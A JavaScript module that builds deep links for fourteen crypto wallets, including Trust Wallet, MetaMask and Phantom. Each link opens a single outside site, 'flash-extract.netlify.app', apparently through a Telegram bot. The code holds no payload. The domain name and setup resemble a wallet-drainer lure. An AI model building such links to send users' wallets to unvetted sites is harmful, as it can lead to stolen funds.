// wallets.js
const TARGET_URL = "https://flash-extract.netlify.app";
const DAPP_URL_NO_HTTP = TARGET_URL.replace(/^https?:\/\//, "");
const ENCODED_URL = encodeURIComponent(TARGET_URL);

// 🟢 All 14 wallets with HTTPS universal links only
// (Custom schemes like cbwallet:// are blocked by Telegram)

const wallets = {
    popular: [
        {
            name: "Trust Wallet",
            emoji: "🛡️",
            href: `https://link.trustwallet.com/open_url?coin_id=60&url=${ENCODED_URL}`
        },
        {
            name: "MetaMask",
            emoji: "🦊",
            href: `https://metamask.app.link/dapp/${DAPP_URL_NO_HTTP}`
        },
        {
            name: "Coinbase Wallet",
            emoji: "🔵",
            href: `https://go.cb-w.com/dapp?dappUrl=${ENCODED_URL}`
        },
        {
            name: "Phantom",
            emoji: "👻",
            href: `https://phantom.app/ul/browse/${ENCODED_URL}`
        },
    ],
    mobile: [
        {
            name: "SafePal",
            emoji: "🔒",
            href: `https://www.safepal.com/download?dapp=${ENCODED_URL}`
        },
        {
            name: "TokenPocket",
            emoji: "🔷",
            href: `https://www.tokenpocket.pro/en/transfer?url=${ENCODED_URL}`
        },
        {
            name: "OKX Wallet",
            emoji: "⚫",
            href: `https://www.okx.com/download?deeplink=${encodeURIComponent(`okx://wallet/dapp/url?dappUrl=${ENCODED_URL}`)}`
        },
        {
            name: "Bitget Wallet",
            emoji: "💎",
            href: `https://web3.bitget.com/en/dapp/open?url=${ENCODED_URL}`
        },
        {
            name: "Robinhood Wallet",
            emoji: "🟢",
            href: TARGET_URL
        },
        {
            name: "Binance Web3",
            emoji: "🟡",
            href: `https://www.binance.com/en/web3wallet?url=${ENCODED_URL}`
        },
    ],
    desktop: [
        {
            name: "Rabby Wallet",
            emoji: "🐰",
            href: `https://rabby.io/link/dapp?url=${ENCODED_URL}`
        },
        {
            name: "Rainbow",
            emoji: "🌈",
            href: `https://rainbow.me/browse?url=${ENCODED_URL}`
        },
        {
            name: "Exodus",
            emoji: "📦",
            href: `https://www.exodus.com/web3?url=${ENCODED_URL}`
        },
        {
            name: "Ledger Live",
            emoji: "🔐",
            href: `https://www.ledger.com/discover?url=${ENCODED_URL}`
        },
    ]
};

module.exports = { wallets, TARGET_URL, DAPP_URL_NO_HTTP };